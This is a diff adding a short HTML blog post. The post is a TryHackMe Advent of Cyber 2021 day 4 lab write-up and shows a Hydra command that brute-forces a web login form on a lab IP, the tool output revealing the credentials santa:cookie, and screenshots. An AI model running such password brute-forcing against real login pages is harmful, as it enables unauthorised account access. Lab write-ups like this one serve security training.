@@ -1,0 +1,49 @@
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../../../../index.css"/>
+<link rel="stylesheet" href="../../../../highlight/styles/monokai.min.css"/>
+<script src="../../../../highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<h1>/f0c1s/blog/sec/THM/advent2021/day4</h1>
+
+<p>
+    <a href="../../index.html">/blog</a>
+    <a href="../../../../sec/index.html">Security</a>
+    <a href="../../../../sec/THM/index.html">TryHackMe writeups</a>
+    <a href="../../../../sec/THM/advent2021/index.html">advent 2021</a>
+    <a href="../../../../sec/THM/advent2021/day4/day4.html">+ day 4</a>
+</p>
+
+<h1 id="thm-advent2021-day4">THM Advent2021 day4</h1>
+<figure>
+    <img src="1-login-form-error.png" alt=""/>
+    <figcaption>1-login-form-error</figcaption>
+</figure>
+<figure>
+    <img src="2-found-password.png" alt=""/>
+    <figcaption>2-found-password</figcaption>
+</figure>
+<pre class="shell"><code>hydra -l santa -P passwords.txt  10.10.39.22  http-post-form &#39;/:username=^USER^&amp;password=^PASS^&amp;submit=Login:F=Invalid username and password&#39;
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-05 15:17:37
+[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:1/p:15), ~1 try per task
+[DATA] attacking http-post-form://10.10.39.22:80/:username=^USER^&amp;password=^PASS^&amp;submit=Login:F=Invalid username and password
+[80][http-post-form] host: 10.10.39.22   login: santa   password: cookie
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-05 15:17:39
+</code></pre>
+<blockquote>
+    <p>Credentials santa:cookie</p>
+</blockquote>
+<blockquote>
+    <p>http://10.10.39.22/calendar.php post login</p>
+</blockquote>
+<figure>
+    <img src="3-post-login.png" alt=""/>
+    <figcaption>3-post-login</figcaption>
+</figure>
+<figure>
+    <img src="4-done.png" alt=""/>
+    <figcaption>4-done</figcaption>
+</figure>
